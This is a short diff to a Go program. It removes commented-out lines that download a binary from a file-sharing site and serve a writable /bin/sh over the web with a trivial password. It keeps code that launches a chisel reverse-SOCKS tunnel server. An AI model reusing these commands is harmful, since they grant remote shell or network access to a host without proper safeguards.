@@ -26,13 +26,8 @@ func main() {
         log.Printf("get cwd error %v\n", err)
         return
     }
-    log.Printf("current dir %s\n", current_dir)
-    // runShell("wget https://filebin.net/9fhkp776kjqqjjn1/gotty")
-    // runShell("chmod +x ./gotty")
-    // runShell("./gotty --port 8000 --permit-write --reconnect --credential hello:1 /bin/sh")
-    
+    log.Printf("current dir %s\n", current_dir)    
     runShell("chmod +x ./chisel")
-   
     cmd = exec.Command("./chisel", "server", "--port", "8000", "--backend", "--socks5", "--reverse")
     cmd.Stdout = os.Stdout
     cmd.Stderr = os.Stderr
